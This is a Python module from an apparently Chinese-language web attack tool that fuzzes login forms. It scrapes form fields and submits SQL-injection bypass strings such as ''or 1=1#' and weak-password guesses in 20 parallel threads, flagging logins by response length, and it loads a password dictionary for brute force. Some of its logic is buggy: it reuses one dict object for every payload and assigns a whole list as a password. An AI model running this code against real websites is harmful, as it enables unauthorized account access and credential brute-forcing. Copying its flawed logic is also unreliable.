#!/usr/bin/python
# -*- coding:utf8 -*-
#author:Jinhao

import os
from concurrent.futures import ThreadPoolExecutor
from reports import reports
from bs4 import BeautifulSoup
from .color_output import *

weak_dict = ['123', '888', '@123', '666']  # 常用弱密码后缀
sql_pass = ['\'or 1=1#', '"or 1=1#', '\')or 1=1#', 'or 1=1--', 'a\'or\'1=1--', '\'OR 1=1%00']  # sql万能密码
payload = weak_dict+sql_pass

class Login:
    def __init__(self,url,REQ,file,name,flag):
        self.url = url
        self.REQ = REQ
        self.file = file
        self.name = name
        self.flag = flag

    def start(self):
        exp = []
        print(fuchsia('>>>>>Login_fuzz'+'-'*40))
        print(yellow('[ tips ] ') + fuchsia('有很多payload文件保存在./dict/login目录下'))
        args = self.get_args()
        if not args:
            print(yellow('[ warn ] ') + red('未识别到登录框'))
            print(fuchsia('-' * 40 + 'Login_fuzz<<<<<'))
            return
        data = {}
        for x in args:
            if not args[x]:
                data[x] = input('请输入 {} 的值\n'.format(x))
            else:
                data[x] = args[x]
        print(blue('[ Load ] ') + fuchsia('data:') + cyan(data))
        exp = self.add_payload(data,payload)
        if self.file or self.flag:
            payloads = self.load_file(self.file)
            if payloads:
                print(blue('[ Load ] ') + green('payload导入成功'))
                exp += self.set_payload(data, payloads)
            else:
                print(blue('[ Load ] ') + red('payload导入失败'))
        # print(exp)
        report = self.run(exp)
        if report:
            reports.Report(report, self.name, 'login_report.txt', '网站密码fuzz报告已存放于', '没有探测出网站密码').save()
        else:
            print(blue('[ result ] ') + yellow('没有探测出网站密码'))
        print(fuchsia('-'*40+'Login_fuzz<<<<<'))
        return

    def get_args(self):
        '''
        获取表单元素和值
        :return:dict
        '''
        args = {}
        res = self.REQ.mGetAccess(self.url)
        soup = BeautifulSoup(res.content, 'html.parser')
        xxx = soup.find_all('input')
        for i in xxx:
            args[i.get('name')] = i.get('value')
        return args


    def load_file(self,file):
        '''
        加载指定payload
        :param file:
        :return:
        '''
        path = os.path.dirname(__file__)
        if file:
            return file

        else:
            payload = []
            file = 'password.txt'
            filepath = "{0}/{1}/{2}".format(path, r'../dict/login', file)
            F = open(filepath, 'r')
            for x in F:
                payload.append(x.replace('\n', ''))

        payload = list(set(payload))   # payload去重
        return payload


    def add_payload(self,data,payloads):
        '''
        拼接payload
        :param data:
        :param payloads:
        :return:
        '''
        exp = []
        pwd = list(data)[1]
        p_v = data[pwd]
        try:
            self.len = len(self.REQ.autoPostAccess(self.url,data=data).content)   # 设置默认网站长度
        except:
            raise('获取网站长度失败')

        for x in payloads:
            data[pwd] = p_v + x    # 仅仅修改密码部分
            exp.append(data)
        return exp


    def set_payload(self,data,payloads):
        '''
        设置payload
        :param data: dict
        :param payloads: 弱密码集
        :return: data
        '''
        exp = []
        pwd = list(data)[1]

        for x in payloads:
            data[pwd] = payloads
            exp.append(data)
        return exp


    def run(self,exp):
        '''
        多线程跑fuzz
        :param exp:data集
        :return:报告
        '''
        report = []
        with ThreadPoolExecutor(max_workers=20) as pool:
            results = pool.map(self.fuzz,exp)
            for result in results:
                # print(result['len'])
                if result['flag'] == 1:
                    # color_output(result['msg'], color='GREEN')
                    report.append(result['msg'])
        return report


    def fuzz(self,data):
        '''
        fuzz模块
        :param data:
        :return:
        '''
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
        }
        try:
            res = self.REQ.autoPostAccess(self.url, data=data, headers=headers).content
            length = len(res)
            if length != self.len:
                msg = {'flag':1,'msg':data,'len':length}
                print(green('[ result ] ')
                      + fuchsia('data:') + green(data) + interval()
                      + fuchsia('length:') + green(length)
                      )
                return msg
            else:
                msg = {'flag': 0,'len':length}
                return msg
        except:
            msg = {'flag':0,'len':0}
            return msg

